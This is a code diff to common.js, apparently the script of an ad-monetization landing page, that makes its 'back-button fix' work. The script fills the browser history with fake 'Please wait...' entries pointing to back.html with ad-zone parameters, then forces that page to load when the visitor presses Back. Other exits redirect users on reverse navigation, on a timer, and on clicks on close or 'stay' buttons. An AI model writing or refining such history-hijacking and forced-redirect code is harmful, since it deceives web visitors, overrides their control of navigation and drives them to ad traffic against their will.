@@ -1,10 +1,10 @@
-/* common.js — FULL MONOLITHIC VERSION (Back-Fix + Clone + Multi-Exit) */
+/* common.js — FULL MONOLITHIC VERSION (Back-Fix + Clone + Multi-Exit) [BACK FIXED] */
 
 (() => {
   "use strict";
 
   const safe = (fn) => { try { return fn(); } catch { return undefined; } };
-  
+
   const replaceTo = (url) => {
     try { window.location.replace(url); } catch { window.location.href = url; }
   };
@@ -22,7 +22,9 @@
   const CLONE_PARAM = "__cl";
   const isClone = getSP(CLONE_PARAM) === "1";
 
-  // Сбор всех возможных параметров трекинга
+  // ---------------------------
+  // Tracking params
+  // ---------------------------
   const IN = {
     pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
     z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
@@ -52,7 +54,9 @@
     } catch { return ""; }
   };
 
-  // Тот самый нормализатор, который превращает плоский APP_CONFIG в объекты
+  // ---------------------------
+  // Config Normalizer
+  // ---------------------------
   const normalizeConfig = (appCfg) => {
     if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
     const cfg = { domain: appCfg.domain };
@@ -69,10 +73,10 @@
         ex[tab][field] = v;
         return;
       }
-      
+
       m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
       if (m) { ensure(m[1])[m[2]] = v; return; }
-      
+
       m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
       if (m) {
         const [, name, field] = m;
@@ -82,9 +86,13 @@
         ex[tab][field] = v;
       }
     });
+
     return cfg;
   };
 
+  // ---------------------------
+  // URL Builders
+  // ---------------------------
   const buildExitQSFast = ({ zoneId }) => {
     const base = {
       ymid: IN.var_1 || IN.var || "", var: IN.var_2 || IN.z || "", var_3: IN.var_3 || "",
@@ -106,33 +114,73 @@
     return url.toString();
   };
 
+  // ---------------------------
+  // BACK (FIXED)
+  // ---------------------------
+
+  // One-shot guard: avoid inflating history by multiple initBack calls
+  let __backInited = false;
+
+  // Prevent re-entrant firing when forcing load
+  let __backFiring = false;
+
   const pushBackStates = (url, count) => {
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
       const originalUrl = window.location.href;
-      for (let i = 0; i < n; i++) { 
-        window.history.pushState({ __isBack: true }, "Please wait...", url); 
+
+      for (let i = 0; i < n; i++) {
+        window.history.pushState({ __isBack: true }, "Please wait...", url);
       }
       window.history.pushState(null, document.title, originalUrl);
-    } catch (e) {}
+    } catch {}
+  };
+
+  // Same idea as your v10: compute default back.html in the same directory
+  const getDefaultBackHtmlUrl = () => {
+    const { origin, pathname } = window.location;
+    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
+    if (dir.endsWith("/")) dir = dir.slice(0, -1);
+    if (!dir) return `${origin}/back.html`;
+    return `${origin}${dir}/back.html`;
   };
 
   const initBackFast = (cfg) => {
+    if (__backInited) return;
     const b = cfg?.back?.currentTab;
     if (!b) return;
-    const pageFile = cfg.back?.pageUrl || "back.html";
-    const pageUrl = new URL(pageFile, window.location.origin + window.location.pathname);
-    
+
+    __backInited = true;
+
+    const count = cfg.back?.count ?? 10;
+    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
+
+    // Build back page absolute URL relative to current page (safe for absolute/relative)
+    const page = new URL(pageUrl, window.location.href);
+
     const qs = buildExitQSFast({ zoneId: b.zoneId });
     if (b.url) qs.set("url", String(b.url));
-    else { 
-      qs.set("z", String(b.zoneId)); 
-      qs.set("domain", String(b.domain || cfg.domain || "")); 
+    else {
+      qs.set("z", String(b.zoneId));
+      qs.set("domain", String(b.domain || cfg.domain || ""));
     }
-    pageUrl.search = qs.toString();
-    pushBackStates(pageUrl.toString(), cfg.back?.count ?? 10);
+    page.search = qs.toString();
+
+    pushBackStates(page.toString(), count);
   };
 
+  // Critical piece: pushState does NOT load back.html; force-load it on popstate back step
+  window.addEventListener("popstate", (e) => {
+    if (e?.state && e.state.__isBack && !__backFiring) {
+      __backFiring = true;
+      // At this moment address bar already contains back.html?... -> force actual navigation
+      replaceTo(window.location.href);
+    }
+  });
+
+  // ---------------------------
+  // Exits
+  // ---------------------------
   const resolveUrlFast = (ex, cfg) => {
     if (!ex) return "";
     if (ex.url) return String(ex.url);
@@ -165,13 +213,16 @@
     return runExitCurrentTabFast(cfg, name, true);
   };
 
+  // ---------------------------
+  // Reverse / Autoexit
+  // ---------------------------
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
     safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
-    window.addEventListener("popstate", (e) => { 
-        if (!e.state || !e.state.__isBack) {
-            runExitCurrentTabFast(cfg, "reverse", false); 
-        }
+    window.addEventListener("popstate", (e) => {
+      // Do not hijack back stack steps
+      if (e?.state && e.state.__isBack) return;
+      runExitCurrentTabFast(cfg, "reverse", false);
     });
   };
 
@@ -186,6 +237,9 @@
     ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
   };
 
+  // ---------------------------
+  // Clone / Micro handoff
+  // ---------------------------
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
@@ -205,14 +259,17 @@
     }
   };
 
+  // ---------------------------
+  // Click map
+  // ---------------------------
   const initClickMap = (cfg) => {
     let fired = false;
     const microTargets = new Set(["chest_play", "chest_lost", "banner_close", "modal_stay"]);
 
     document.addEventListener("click", (e) => {
       const t = e.target?.closest?.("[data-target]")?.getAttribute("data-target") || "";
-      
-      // КРИТИЧЕСКАЯ ПРАВКА: Если это клон, "прогреваем" бэк по первому клику
+
+      // If this is clone, ensure back is armed (one-shot)
       if (isClone) initBackFast(cfg);
 
       if (isClone) {
@@ -232,24 +289,23 @@
     }, true);
   };
 
+  // ---------------------------
+  // Boot
+  // ---------------------------
   const boot = () => {
     if (typeof window.APP_CONFIG === "undefined") return;
     const cfg = normalizeConfig(window.APP_CONFIG);
     if (!cfg) return;
 
     window.LANDING_EXITS = { cfg, run: (name) => run(cfg, name) };
-    
-    // ПРАВКА: Инициализируем Бэк-фикс СРАЗУ
-    initBackFast(cfg); 
-    
-    // ПРАВКА: Если браузер блокирует pushState в новой вкладке, 
-    // "прогреваем" историю по первому движению юзера
+
+    // Optional: warm-up only once; safe due to one-shot guard
     const warmUp = () => { initBackFast(cfg); };
     ["touchstart", "mousedown", "scroll"].forEach(ev => window.addEventListener(ev, warmUp, { once: true }));
 
     initClickMap(cfg);
     initAutoexit(cfg);
-    initReverse(cfg); 
+    initReverse(cfg);
   };
 
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
